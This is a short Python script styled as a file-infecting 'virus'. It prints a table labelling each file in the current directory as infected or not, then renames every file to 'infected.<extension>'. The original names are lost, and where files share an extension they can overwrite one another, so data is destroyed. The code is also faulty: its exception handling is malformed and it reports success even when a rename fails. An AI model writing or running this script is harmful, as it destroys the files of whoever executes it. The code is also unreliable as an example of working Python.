from __future__ import print_function
import os, time

def search(path="."):
	normalFiles = set() # set of uninfected file names
	maxLength = fileLength()
	for filename in os.listdir(path): # gets a list of file names in a given path
		print (filename, end='')
		if filename.startswith("infected"):
			printSpace (filename, " Infected", maxLength)
		elif filename == os.path.basename(__file__):
			printSpace (filename, " Infected", maxLength)
		else:
			printSpace (filename, " not infected yet...", maxLength)
			normalFiles.add(filename)
	return normalFiles

def fileLength():
	maxLength = 0 # length of longest string
	normalFiles = list() # set of uninfected file names
	for filename in os.listdir(os.getcwd()): # gets a list of file names in a given path
		stringLength = len(filename)
		if stringLength > maxLength:
			maxLength = stringLength
	return maxLength

def printSpace(filename, msg, maxLength):
	realLength = maxLength - len(filename)
	for x in range(realLength): print (" ", end='')
	print (" " + msg)
	

def infect(filelist):
	error = 0
	print ("")
	for filename in filelist:
		print ("Infecting... " + filename)
		try:
			os.rename(filename, "infected." + str(filename.split(".")[-1]))
		except error <= 3:
			print ("Infect failed... Trying again...\n")
			time.sleep(2)
			infect(search())
			error += 1
		finally:
			print ("    Success Infected")

filelist = search()

infect(filelist)
